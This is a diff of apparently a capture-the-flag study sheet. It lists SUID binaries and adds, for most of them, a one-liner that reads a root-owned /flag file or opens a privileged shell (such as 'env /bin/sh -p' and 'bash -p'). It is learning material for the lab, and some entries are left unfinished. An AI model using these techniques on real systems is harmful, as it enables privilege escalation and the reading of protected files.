@@ -2,35 +2,35 @@ All commands whose suid bit is already set
 -rwsr-xr-x 1 root root
 
 __Lets u directly read the flag!
-cat
-more 
-less
-tail
-head
-sort
+cat          cat /flag
+more         more /flag
+less         less /flag
+tail         tail /flag
+head         head /flag
+sort         sort /flag
 
 ____Shows you that an over-privileged editor is a very powerful tool!
-vim
-emacs
-nano
+vim          vim /flag
+emacs        emacs -nw /flag
+nano         nano /flag
 
 ____Requires you to understand their output to derive the flag from it!
-rev
-hd
-od
-xxd
-base32
-base64
-split
+rev          rev /flag | rev
+hd           hd /flag
+od           od -c /flag
+xxd          xxd /flag | xxd -r
+base32       base32 /flag | base32 -d
+base64       base64 /flag | base64 -d
+split        split -l 1 /flag -> cat xaa
 
 ___Forces you to understand different archive formats!
-gzip
-bzip2
-zip
-tar
-ar
-cpio
-genisoimage
+gzip         gzip /flag -> gzip -dc /flag
+bzip2        bizp2 /flag -> bzip2 -dc /flag.bz2
+zip          zip /flag.zip /flag  -> cat /flag.zip
+tar          tar -cf archive.tar /flag -> cat archive.tar
+ar           ar -q archive /flag -> cat archive
+cpio         echo /flag | cpio -o > archive.cpio -> cat archive.cpio
+genisoimage  genisoimage -sort /flag
 
 ___Enables you to read flags by making them execute other commands!
 env          env /bin/sh -p
@@ -56,18 +56,18 @@ cp          cp /flag theflag
 mv
 
 ___Lets you read the flag because they let you program anything!
-perl
-python
-ruby
-bash
+perl        print do { local (@ARGV, $/) = "/flag"; <> };
+python      python -c 'print(open("/flag").read())'
+ruby        puts File.read("/flag")
+bash        bash -p -c "cat /flag"
 
 ___Just straight up wasn't designed to let you read files!
-date
-dmesg
-wc
-gcc
-as
-wget
+date        date -f /flag
+dmesg       dmesg -F /flag
+wc          wc --files0-from=/flag
+gcc         gcc @/flag
+as          as @/flag
+wget        
 ssh-keygen
 
 
